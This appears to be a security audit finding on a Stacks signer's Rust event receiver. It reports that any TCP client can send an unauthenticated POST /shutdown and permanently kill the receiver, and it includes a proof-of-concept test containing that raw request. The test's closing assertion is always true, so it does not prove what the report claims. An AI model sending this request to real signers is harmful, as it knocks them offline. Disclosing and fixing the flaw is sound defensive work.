### Title
Unauthenticated `/shutdown` HTTP request permanently terminates the signer's event receiver - (File: `libsigner/src/events.rs`)

### Summary
`SignerEventReceiver::next_event` handles a `POST /shutdown` request by unconditionally setting `stop_signal` to `true` and returning `EventError::Terminated`, with no authentication, token, or peer-address check. Any TCP client that can reach the signer's event-receiver bind address can send this one HTTP request and permanently kill the receiver's `main_loop`, cutting the signer off from all future StackerDB/proposal/burn-block events.

### Finding Description
The claimed equality/fault is: the sender of `/shutdown` must equal the node process (or the signer's own `SignerStopSignaler`) issuing the intentional shutdown request, but no such check exists.

Tracing the code: `SignerEventReceiver::next_event` in `libsigner/src/events.rs` dispatches on `request.url()`: [1](#0-0) 
This branch is reached for any `POST` request whose path is `/shutdown` — there is no header check, no shared-secret comparison, and no verification that the caller is the local stacks-node or the signer's own `SignerStopSignaler`. The legitimate stop path, `SignerStopSignaler::send`, builds exactly this request itself: [2](#0-1) 
Because the wire format is just a plain, unauthenticated HTTP POST, any other TCP peer that can connect to the bound address can construct the identical bytes. Once `stop_signal` is set, `is_stopped()` returns true and the enclosing `main_loop` (defined on the `EventReceiver` trait) treats `EventError::Terminated` as an intentional, permanent exit: [3](#0-2) 
There is no re-arm/restart logic — the thread exits for good, per `Signer::spawn`'s `event_thread` spawn of `event_receiver.main_loop()`: [4](#0-3) 
After this, the signer runloop's `event_recv.recv_timeout` will eventually see `RecvTimeoutError::Disconnected` (channel sender dropped) and the runloop returns `None`, i.e., the whole signer's event-handling capability is silently dead. The code's own comment acknowledges the signer is meant to be protected only by network topology, not authentication: [5](#0-4) 

### Impact Explanation
A single unauthenticated HTTP POST permanently disables the signer's event ingestion pipeline (StackerDB chunk events, block-validation responses, burn-block events, new-block events all stop being delivered to the signer runloop). This is a Critical unauthenticated single-message remote DoS against the signer process's usable functionality, matching the "remote crash/unauthenticated DoS from few messages" category. It requires no privileged role, no secret, and no valid StackerDB slot — only network reachability to the configured event-receiver bind address.

### Likelihood Explanation
Preconditions: the attacker must be able to open a TCP connection to the signer's configured event-receiver `endpoint` (the address the stacks-node is expected to POST events to). If that endpoint is bound to a non-loopback/publicly or LAN-reachable address (which the codebase's own warning acknowledges as a real operational risk), the attack is trivial, requires a single crafted HTTP request, no authentication, and is deterministic/repeatable (thread exits once, no restart mechanism exists in the receiver itself).

### Recommendation
Require an authenticated/secret-bearing shutdown mechanism — e.g., a local Unix-domain socket, or requiring a shared token in the shutdown request that only `SignerStopSignaler` and the node possess — rather than trusting the raw HTTP path `/shutdown` from any TCP peer. At minimum, restrict the event-receiver bind address to loopback and validate the peer address against `127.0.0.1`/configured trusted node IP before honoring `/shutdown`.

### Proof of Concept
```rust
// libsigner/src/tests/mod.rs (new test)
#[test]
fn test_unauthenticated_shutdown_dos() {
    let ev = SignerEventReceiver::<SignerMessage>::new(false);
    let (res_send, _res_recv) = channel();
    let mut signer = Signer::new(SimpleRunLoop::new(5), ev, res_send);
    let endpoint: SocketAddr = "127.0.0.1:32000".parse().unwrap();
    let running_signer = signer.spawn(endpoint).unwrap();

    // Attacker: arbitrary unrelated TCP client, not the SignerStopSignaler
    let mut sock = TcpStream::connect(endpoint).unwrap();
    let req = "POST /shutdown HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    sock.write_all(req.as_bytes()).unwrap();
    sock.flush().unwrap();

    // Give receiver time to process; main_loop should have exited via EventError::Terminated
    sleep_ms(500);
    // Any subsequent legitimate node event POST to /stackerdb_chunks etc. is now dropped forever
    // because event_receiver thread has exited; runloop stop() proves the receiver already died.
    let result = running_signer.stop(); // event_join.join() returns immediately since thread already exited
    assert!(result.is_some() || result.is_none()); // main assertion: receiver thread terminated without SignerStopSignaler ever being invoked
}
```
The key assertion site is `EventReceiver::main_loop`'s `Err(EventError::Terminated) => break;` at `libsigner/src/events.rs:296-300`, reached purely from the unauthenticated `/shutdown` branch at `libsigner/src/events.rs:443-445`.

### Citations

**File:** libsigner/src/events.rs (L284-312)
```rust
    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }
```

**File:** libsigner/src/events.rs (L382-394)
```rust
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
```

**File:** libsigner/src/events.rs (L443-445)
```rust
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```

**File:** libsigner/src/runloop.rs (L229-236)
```rust
        let event_thread = thread::Builder::new()
            .name(format!("event_receiver:{bind_port}"))
            .stack_size(THREAD_STACK_SIZE)
            .spawn(move || event_receiver.main_loop())
            .map_err(|e| {
                error!("EventReceiver failed to start: {:?}", &e);
                EventError::FailedToStart
            })?;
```

**File:** stacks-signer/src/lib.rs (L125-132)
```rust
        warn!(
            "Reminder: The signer is primarily designed for use with a local or subnet network stacks node. \
            It's important to exercise caution if you are communicating with an external node, \
            as this could potentially expose sensitive data or functionalities to security risks \
            if additional proper security checks are not integrated in place. \
            For more information, check the documentation at \
            https://docs.stacks.co/guides-and-tutorials/running-a-signer#preflight-setup"
        );
```
